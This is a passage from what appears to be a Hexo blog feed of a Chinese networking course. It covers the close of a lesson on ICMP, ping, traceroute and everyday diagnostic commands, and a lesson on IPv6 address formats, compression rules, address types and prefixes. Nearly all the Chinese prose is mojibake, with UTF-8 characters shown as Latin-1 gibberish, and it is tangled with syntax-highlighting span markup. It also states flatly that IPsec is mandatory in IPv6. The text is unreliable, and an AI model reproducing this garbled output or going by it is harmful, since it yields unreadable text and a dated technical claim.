class="hljs-built_in">Type</span>ï¼ˆç±»å‹ï¼‰<br>- Codeï¼ˆä»£ç ï¼‰<br>- Checksumï¼ˆæ ¡éªŒå’Œï¼‰<br>- æ•°æ®éƒ¨åˆ†<br><br><span class="hljs-built_in">ping</span>æµç¨‹ï¼š<br>å‘é€ICMP <span class="hljs-built_in">Echo</span> Request (<span class="hljs-built_in">Type</span> <span class="hljs-number">8</span>)<br>â†’ ç›®æ ‡è¿”å›<span class="hljs-built_in">Echo</span> Reply (<span class="hljs-built_in">Type</span> <span class="hljs-number">0</span>)<br>â†’ è®¡ç®—RTT<br><br>tracerouteæµç¨‹ï¼š<br>TTL=<span class="hljs-number">1</span> â†’ ç¬¬<span class="hljs-number">1</span>è·³è¿”å›è¶…æ—¶<br>TTL=<span class="hljs-number">2</span> â†’ ç¬¬<span class="hljs-number">2</span>è·³è¿”å›è¶…æ—¶<br>...<br>ç›´åˆ°ç›®æ ‡ä¸»æœº<br><br>å¸¸ç”¨å·¥å…·ï¼š<br><span class="hljs-built_in">ping</span>ï¼šæµ‹è¯•è¿é€šæ€§<br>tracerouteï¼šè¿½è¸ªè·¯å¾„<br>mtrï¼šå®æ—¶ç›‘æ§<br>tcpdumpï¼šæŠ“åŒ…åˆ†æ<br></code></pre></td></tr></table></figure><h3 id="å®ç”¨æŠ€å·§"><a href="#å®ç”¨æŠ€å·§" class="headerlink" title="å®ç”¨æŠ€å·§"></a>å®ç”¨æŠ€å·§</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> å¿«é€Ÿè¿é€šæ€§æµ‹è¯•ï¼š<br>   ping -c 1 -W 1 target<br><br><span class="hljs-bullet">2.</span> æŒç»­ç›‘æ§ç½‘ç»œè´¨é‡ï¼š<br>   mtr target<br><br><span class="hljs-bullet">3.</span> è¯Šæ–­DNSé—®é¢˜ï¼š<br>   nslookup / dig<br><br><span class="hljs-bullet">4.</span> æŸ¥çœ‹è¿æ¥çŠ¶æ€ï¼š<br>   ss -antp<br><br><span class="hljs-bullet">5.</span> æŠ“åŒ…åˆ†æï¼š<br>   tcpdump icmp -i any<br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š"><a href="#æ˜å¤©é¢„å‘Š" class="headerlink" title="æ˜å¤©é¢„å‘Š"></a>æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬25å¤©ï¼šARPåè®®å’Œé“¾è·¯å±‚</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>ARPåè®®åŸç†</li><li>ARPç¼“å­˜ç®¡ç†</li><li>ARPæ¬ºéª—å’Œé˜²å¾¡</li><li>RARPå’Œä»£ç†ARP</li><li>é“¾è·¯å±‚å…¶ä»–åè®®</li><li>ç½‘ç»œå®‰å…¨å®è·µ</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä»Šå¤©æˆ‘ä»¬æ·±å…¥å­¦ä¹ äº†ICMPåè®®å’Œå„ç§ç½‘ç»œè¯Šæ–­å·¥å…·ï¼Œè¿™äº›æ˜¯ç½‘ç»œå·¥ç¨‹å¸ˆæ—¥å¸¸å·¥ä½œçš„å¿…å¤‡æŠ€èƒ½ã€‚ç†è§£pingå’Œtracerouteçš„åŸç†ï¼Œèƒ½è®©æˆ‘ä»¬æ›´å¥½åœ°è¯Šæ–­å’Œè§£å†³ç½‘ç»œé—®é¢˜ã€‚æ˜å¤©æˆ‘ä»¬å°†å­¦ä¹ ARPåè®®ï¼Œäº†è§£IPåœ°å€å¦‚ä½•æ˜ å°„åˆ°MACåœ°å€ï¼</p><p><strong>è¿›åº¦ï¼š24&#x2F;180å¤©ï¼ˆ13.3%ï¼‰</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>23å¤©ï¼šIPv6è¯¦è§£</title>
    <link href="/2025/11/10/23%E5%A4%A9%EF%BC%9AIPv6%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/10/23%E5%A4%A9%EF%BC%9AIPv6%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬23å¤©ï¼šIPv6è¯¦è§£"><a href="#ç¬¬23å¤©ï¼šIPv6è¯¦è§£" class="headerlink" title="ç¬¬23å¤©ï¼šIPv6è¯¦è§£"></a>ç¬¬23å¤©ï¼šIPv6è¯¦è§£</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£IPv6äº§ç”Ÿçš„èƒŒæ™¯å’Œå¿…è¦æ€§</li><li>æŒæ¡IPv6åœ°å€æ ¼å¼å’Œè¡¨ç¤ºæ–¹æ³•</li><li>å­¦ä¹ IPv6ç‰¹æ€§å’Œä¼˜åŠ¿</li><li>äº†è§£IPv6æŠ¥æ–‡æ ¼å¼</li><li>ç†è§£IPv6åœ°å€ç±»å‹</li><li>å­¦ä¹ IPv6è¿‡æ¸¡æŠ€æœ¯</li><li>å®ç°IPv6åœ°å€è§£æå·¥å…·</li></ul><hr><h2 id="1-IPv6æ¦‚è¿°"><a href="#1-IPv6æ¦‚è¿°" class="headerlink" title="1. IPv6æ¦‚è¿°"></a>1. IPv6æ¦‚è¿°</h2><h3 id="1-1-ä¸ºä»€ä¹ˆéœ€è¦IPv6ï¼Ÿ"><a href="#1-1-ä¸ºä»€ä¹ˆéœ€è¦IPv6ï¼Ÿ" class="headerlink" title="1.1 ä¸ºä»€ä¹ˆéœ€è¦IPv6ï¼Ÿ"></a>1.1 ä¸ºä»€ä¹ˆéœ€è¦IPv6ï¼Ÿ</h3><p><strong>IPv4åœ°å€è€—å°½</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv4åœ°å€ç©ºé—´ï¼š<br><span class="hljs-bullet">- </span>32ä½åœ°å€<br><span class="hljs-bullet">- </span>æ€»æ•°ï¼š2^32 = 4,294,967,296 â‰ˆ 43äº¿ä¸ª<br><span class="hljs-bullet">- </span>å®é™…å¯ç”¨ï¼šæ›´å°‘ï¼ˆä¿ç•™åœ°å€ã€ç§æœ‰åœ°å€ç­‰ï¼‰<br><br>å…¨çƒéœ€æ±‚ï¼š<br><span class="hljs-bullet">- </span>å…¨çƒäººå£ï¼šçº¦80äº¿<br><span class="hljs-bullet">- </span>æ¯äººå¤šè®¾å¤‡ï¼šæ‰‹æœºã€ç”µè„‘ã€å¹³æ¿ã€æ‰‹è¡¨...<br><span class="hljs-bullet">- </span>ç‰©è”ç½‘è®¾å¤‡ï¼šæ•°ç™¾äº¿<br><span class="hljs-bullet">- </span>æ˜æ˜¾ä¸å¤Ÿç”¨ï¼<br><br>åœ°å€è€—å°½æ—¶é—´çº¿ï¼š<br><span class="hljs-bullet">- </span>2011å¹´ï¼šIANAåˆ†é…å®Œæœ€åçš„IPv4åœ°å€å—<br><span class="hljs-bullet">- </span>2012-2019ï¼šå„åœ°åŒºé™†ç»­è€—å°½<br><span class="hljs-bullet">- </span>ç°çŠ¶ï¼šä¾èµ–NATç­‰æŠ€æœ¯ç¼“è§£<br></code></pre></td></tr></table></figure><p><strong>NATçš„å±€é™æ€§</strong>ï¼š</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs smali">NATè™½ç„¶ç¼“è§£äº†åœ°å€çŸ­ç¼ºï¼Œä½†å¸¦æ¥é—®é¢˜ï¼š<br><br>âŒ ç ´åç«¯åˆ°ç«¯è¿æ¥æ€§<br>âŒ å¢åŠ å¤æ‚åº¦å’Œå»¶è¿Ÿ<br>âŒ P2Påº”ç”¨å›°éš¾<br>âŒ éœ€è¦ç»´æŠ¤çŠ¶æ€è¡¨<br>âŒ è¿ååˆ†å±‚åŸåˆ™<br>âŒ æŸäº›åè®®ä¸æ”¯æŒ<br><br>IPv6æ˜¯æ ¹æœ¬è§£å†³æ–¹æ¡ˆ<br></code></pre></td></tr></table></figure><h3 id="1-2-IPv6çš„ä¼˜åŠ¿"><a href="#1-2-IPv6çš„ä¼˜åŠ¿" class="headerlink" title="1.2 IPv6çš„ä¼˜åŠ¿"></a>1.2 IPv6çš„ä¼˜åŠ¿</h3><p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> å·¨å¤§çš„åœ°å€ç©ºé—´<br>   âœ… 128ä½åœ°å€<br>   âœ… 2^128 â‰ˆ 340ä¸‡äº¿äº¿äº¿äº¿ä¸ª<br>   âœ… è¶³å¤Ÿç”¨å‡ ç™¾å¹´<br><br><span class="hljs-bullet">2.</span> ç®€åŒ–çš„æŠ¥æ–‡å¤´éƒ¨<br>   âœ… å›ºå®š40å­—èŠ‚ï¼ˆIPv4ä¸º20-60å­—èŠ‚ï¼‰<br>   âœ… æé«˜è·¯ç”±æ•ˆç‡<br>   âœ… æ‰©å±•å¤´éƒ¨æœºåˆ¶<br><br><span class="hljs-bullet">3.</span> æ›´å¥½çš„ç§»åŠ¨æ€§<br>   âœ… ç§»åŠ¨IPv6<br>   âœ… æ— éœ€NAT<br>   âœ… æ›´å¿«çš„åˆ‡æ¢<br><br><span class="hljs-bullet">4.</span> å†…ç½®å®‰å…¨æ€§<br>   âœ… IPSecæ˜¯å¼ºåˆ¶çš„<br>   âœ… ç«¯åˆ°ç«¯åŠ å¯†<br><br><span class="hljs-bullet">5.</span> æ›´å¥½çš„QoSæ”¯æŒ<br>   âœ… æµæ ‡ç­¾<br>   âœ… ä¼˜å…ˆçº§<br><br><span class="hljs-bullet">6.</span> æ— éœ€NAT<br>   âœ… ç«¯åˆ°ç«¯è¿æ¥<br>   âœ… ç®€åŒ–ç½‘ç»œ<br>   âœ… æ›´å¥½çš„æ€§èƒ½<br><br><span class="hljs-bullet">7.</span> è‡ªåŠ¨é…ç½®<br>   âœ… æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®ï¼ˆSLAACï¼‰<br>   âœ… å³æ’å³ç”¨<br>   âœ… ç®€åŒ–ç®¡ç†<br><br><span class="hljs-bullet">8.</span> æ›´å¥½çš„å¤šæ’­<br>   âœ… æ”¹è¿›çš„å¤šæ’­è·¯ç”±<br>   âœ… ä»»æ’­æ”¯æŒ<br></code></pre></td></tr></table></figure><hr><h2 id="2-IPv6åœ°å€æ ¼å¼"><a href="#2-IPv6åœ°å€æ ¼å¼" class="headerlink" title="2. IPv6åœ°å€æ ¼å¼"></a>2. IPv6åœ°å€æ ¼å¼</h2><h3 id="2-1-åœ°å€è¡¨ç¤º"><a href="#2-1-åœ°å€è¡¨ç¤º" class="headerlink" title="2.1 åœ°å€è¡¨ç¤º"></a>2.1 åœ°å€è¡¨ç¤º</h3><p><strong>åŸºæœ¬æ ¼å¼</strong>ï¼š</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ldif">IPv6åœ°å€ï¼š128ä½ = 16å­—èŠ‚<br><br>è¡¨ç¤ºæ–¹æ³•ï¼š<br><span class="hljs-literal">-</span> 8ä¸ª16ä½å­—æ®µ<br><span class="hljs-literal">-</span> æ¯ä¸ªå­—æ®µç”¨4ä¸ªåå…­è¿›åˆ¶æ•°è¡¨ç¤º<br><span class="hljs-literal">-</span> ç”¨å†’å·åˆ†éš”<br><br>å®Œæ•´æ ¼å¼ï¼š<br><span class="hljs-attribute">2001</span>:0db8:0000:0000:0000:ff00:0042:8329<br><br>è¯´æ˜ï¼š<br>2001 : 0db8 : 0000 : 0000 : 0000 : ff00 : 0042 : 8329<br>  â†“      â†“      â†“      â†“      â†“      â†“      â†“      â†“<br> 16ä½   16ä½   16ä½   16ä½   16ä½   16ä½   16ä½   16ä½<br></code></pre></td></tr></table></figure><p><strong>åœ°å€å‹ç¼©è§„åˆ™</strong>ï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs elixir">è§„åˆ™<span class="hljs-number">1</span>ï¼šå‰å¯¼é›¶å‹ç¼©<br>å¯ä»¥çœç•¥æ¯ä¸ªå­—æ®µçš„å‰å¯¼é›¶<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-number">2001</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">db8:</span><span class="hljs-number">0000</span><span class="hljs-symbol">:</span><span class="hljs-number">0000</span><span class="hljs-symbol">:</span><span class="hljs-number">0000</span><span class="hljs-symbol">:ff00</span><span class="hljs-symbol">:</span><span class="hljs-number">0042</span><span class="hljs-symbol">:</span><span class="hljs-number">8329</span><br>â†“<br><span class="hljs-number">2001</span><span class="hljs-symbol">:db8</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:ff00</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">8329</span><br><br>è§„åˆ™<span class="hljs-number">2</span>ï¼šé›¶å‹ç¼©<br>è¿ç»­çš„é›¶å­—æ®µå¯ä»¥ç”¨ :: è¡¨ç¤º<br>ä½†ä¸€ä¸ªåœ°å€ä¸­åªèƒ½ä½¿ç”¨ä¸€æ¬¡ ::<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-number">2001</span><span class="hljs-symbol">:db8</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:ff00</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">8329</span><br>â†“<br><span class="hljs-number">2001</span><span class="hljs-symbol">:db8</span>::<span class="hljs-symbol">ff00:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">8329</span><br><br>é”™è¯¯ç¤ºä¾‹ï¼š<br><span class="hljs-number">2001</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><br>ä¸èƒ½å†™æˆï¼š<span class="hljs-number">2001</span>::<span class="hljs-number">0</span>::<span class="hljs-number">1</span>  âŒï¼ˆä¸¤ä¸ª::ï¼‰<br>åº”è¯¥å†™æˆï¼š<span class="hljs-number">2001</span>::<span class="hljs-number">1</span>     âœ…<br></code></pre></td></tr></table></figure><p><strong>ç‰¹æ®Šåœ°å€è¡¨ç¤º</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æœªæŒ‡å®šåœ°å€ï¼š<br>0:0:0:0:0:0:0:0<br><span class="hljs-bullet">æˆ– ::</span><br><span class="hljs-bullet"></span><br><span class="hljs-bullet"></span>ç¯å›åœ°å€ï¼š<br>0:0:0:0:0:0:0:1<br>æˆ– ::1<br><br>IPv4æ˜ å°„åœ°å€ï¼š<br><span class="hljs-meta">::ffff:192.168.1.1</span><br>å‰96ä½ä¸º0ï¼Œå32ä½ä¸ºIPv4åœ°å€<br></code></pre></td></tr></table></figure><h3 id="2-2-IPv6åœ°å€ç»“æ„"><a href="#2-2-IPv6åœ°å€ç»“æ„" class="headerlink" title="2.2 IPv6åœ°å€ç»“æ„"></a>2.2 IPv6åœ°å€ç»“æ„</h3><p><strong>åœ°å€ç»„æˆ</strong>ï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">IPv6åœ°å€ = å‰ç¼€ + æ¥å£æ ‡è¯†ç¬¦<br><br>å¸¸è§ç»“æ„ï¼ˆ64ä½å‰ç¼€ï¼‰ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚    å‰ç¼€ï¼ˆ64ä½ï¼‰          â”‚   æ¥å£æ ‡è¯†ç¬¦ï¼ˆ64ä½ï¼‰     â”‚<br>â”‚   ç½‘ç»œéƒ¨åˆ†               â”‚    ä¸»æœºéƒ¨åˆ†             â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>å‰ç¼€åˆ†é…ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ <span class="hljs-string">/48</span>  â”‚   <span class="hljs-string">/56</span>    â”‚    <span class="hljs-string">/64</span>     â”‚      æ¥å£ID         â”‚<br>â”‚ ç«™ç‚¹ â”‚  å­ç½‘    â”‚  é“¾è·¯      â”‚     ä¸»æœº            â”‚<br>â””â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><p><strong>å‰ç¼€è¡¨ç¤º</strong>ï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">IPv6å‰ç¼€è¡¨ç¤ºï¼š<br>åœ°å€/å‰ç¼€é•¿åº¦<br><br>ç¤ºä¾‹ï¼š<br>2001<span class="hljs-function">:db8</span>::<span class="hljs-string">/32</span><br>- ç½‘ç»œåœ°å€ï¼š2001<span class="hljs-function">:db8</span>::<br>- å‰ç¼€é•¿åº¦ï¼š32ä½<br><br>å¸¸è§å‰ç¼€é•¿åº¦ï¼š<br><span class="hljs-string">/32</span> - ISPåˆ†é…<br><span class="hljs-string">/48</span> - ç»„ç»‡/ç«™ç‚¹<br><span class="hljs-string">/56</span> - å°å‹ç»„ç»‡<br><span class="hljs-string">/64</span> - å•ä¸ªé“¾è·¯ï¼ˆæœ€å¸¸ç”¨ï¼‰<br><span class="hljs-string">/128</span> - å•ä¸ªä¸»æœº<br></code></pre></td></tr></table></figure><h3 id="2-3-IPv6åœ°å€ç±»å‹"><a href="#2-3-IPv6åœ°å€ç±»å‹" class="headerlink" title="2.3 IPv6åœ°å€ç±»å‹"></a>2.3 IPv6åœ°å€ç±»å‹</h3><p><strong>å•æ’­åœ°å€ï¼ˆUnicastï¼‰</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å•æ’­ = ä¸€å¯¹ä¸€é€šä¿¡<br><br>ç±»å‹ï¼š<br><br><span class="hljs-bullet">1.</span> å…¨å±€å•æ’­åœ°å€ï¼ˆGlobal Unicast Addressï¼‰<br><span class="hljs-bullet">   -</span> å‰ç¼€ï¼š2000::/3ï¼ˆ2å¼€å¤´æˆ–3å¼€å¤´ï¼‰<br><span class="hljs-bullet">   -</span> ç›¸å½“äºIPv4çš„å…¬ç½‘åœ°å€<br><span class="hljs-bullet">   -</span> å…¨çƒå”¯ä¸€ï¼Œå¯è·¯ç”±<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼š2001:db8::1<br><br><span class="hljs-bullet">2.</span> é“¾è·¯æœ¬åœ°åœ°å€ï¼ˆLink-Local Addressï¼‰<br><span class="hljs-bullet">   -</span> å‰ç¼€ï¼šfe80::/10<br><span class="hljs-bullet">   -</span> åªåœ¨æœ¬åœ°é“¾è·¯æœ‰æ•ˆ<br><span class="hljs-bullet">   -</span> ä¸èƒ½è·¯ç”±<br><span class="hljs-bullet">   -</span> è‡ªåŠ¨é…ç½®<br><span class="hljs-bullet">   -</span> ç›¸å½“äºIPv4çš„169.254.0.0/16<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼šfe80::1<br><br><span class="hljs-bullet">3.</span> å”¯ä¸€æœ¬åœ°åœ°å€ï¼ˆUnique Local Addressï¼ŒULAï¼‰<br><span class="hljs-bullet">   -</span> å‰ç¼€ï¼šfc00::/7ï¼ˆå®é™…ä½¿ç”¨fd00::/8ï¼‰<br><span class="hljs-bullet">   -</span> ç›¸å½“äºIPv4çš„ç§æœ‰åœ°å€<br><span class="hljs-bullet">   -</span> æœ¬åœ°è·¯ç”±ï¼Œä¸åœ¨äº’è”ç½‘è·¯ç”±<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼šfd12:3456:789a::1<br><br><span class="hljs-bullet">4.</span> ç¯å›åœ°å€ï¼ˆLoopbackï¼‰<br><span class="hljs-bullet">   -</span> åœ°å€ï¼š::1<br><span class="hljs-bullet">   -</span> ç›¸å½“äºIPv4çš„127.0.0.1<br><br><span class="hljs-bullet">5.</span> æœªæŒ‡å®šåœ°å€<br><span class="hljs-bullet">   -</span> åœ°å€ï¼š::<br><span class="hljs-bullet">   -</span> ç›¸å½“äºIPv4çš„0.0.0.0<br><span class="hljs-bullet">   -</span> è¡¨ç¤º&quot;æ— åœ°å€&quot;<br></code></pre></td></tr></table></figure><p><strong>ä»»æ’­åœ°å€ï¼ˆAnycastï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä»»æ’­ = å‘é€ç»™å¤šä¸ªæ¥å£ä¸­æœ€è¿‘çš„ä¸€ä¸ª<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>å¤šä¸ªèŠ‚ç‚¹å…±äº«ç›¸åŒåœ°å€<br><span class="hljs-bullet">- </span>æ•°æ®åŒ…å‘é€ç»™æœ€è¿‘çš„èŠ‚ç‚¹<br><span class="hljs-bullet">- </span>ç”¨äºè´Ÿè½½å‡è¡¡<br><br>ä½¿ç”¨ï¼š<br><span class="hljs-bullet">- </span>ç›¸åŒæ ¼å¼çš„å•æ’­åœ°å€<br><span class="hljs-bullet">- </span>é€šè¿‡è·¯ç”±é…ç½®å®ç°<br><br>åº”ç”¨åœºæ™¯ï¼š<br><span class="hljs-bullet">- </span>DNSæ ¹æœåŠ¡å™¨<br><span class="hljs-bullet">- </span>CDN<br><span class="hljs-bullet">- </span>è´Ÿè½½å‡è¡¡<br></code></pre></td></tr></table></figure><p><strong>å¤šæ’­åœ°å€ï¼ˆMulticastï¼‰</strong>ï¼š</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ldif">å¤šæ’­ = ä¸€å¯¹å¤šé€šä¿¡<br><br>å‰ç¼€ï¼šff00::/8<br><br>æ ¼å¼ï¼š<br>ff&lt;flags&gt;&lt;scope&gt;:....<br><br>Flagsï¼š<br><span class="hljs-literal">-</span> 0ï¼šæ°¸ä¹…åˆ†é…<br><span class="hljs-literal">-</span> 1ï¼šä¸´æ—¶åˆ†é…<br><br>Scopeï¼ˆèŒƒå›´ï¼‰ï¼š<br><span class="hljs-literal">-</span> 1ï¼šæ¥å£æœ¬åœ°<br><span class="hljs-literal">-</span> 2ï¼šé“¾è·¯æœ¬åœ°<br><span class="hljs-literal">-</span> 5ï¼šç«™ç‚¹æœ¬åœ°<br><span class="hljs-literal">-</span> 8ï¼šç»„ç»‡æœ¬åœ°<br><span class="hljs-literal">-</span> eï¼šå…¨çƒ<br><br>å¸¸ç”¨å¤šæ’­åœ°å€ï¼š<br><span class="hljs-attribute">ff02</span>::1  - æ‰€æœ‰èŠ‚ç‚¹ï¼ˆé“¾è·¯æœ¬åœ°ï¼‰<br><span class="hljs-attribute">ff02</span>::2  - æ‰€æœ‰è·¯ç”±å™¨ï¼ˆé“¾è·¯æœ¬åœ°ï¼‰<br><span class="hljs-attribute">ff02</span>::1:ff00:0/104 - 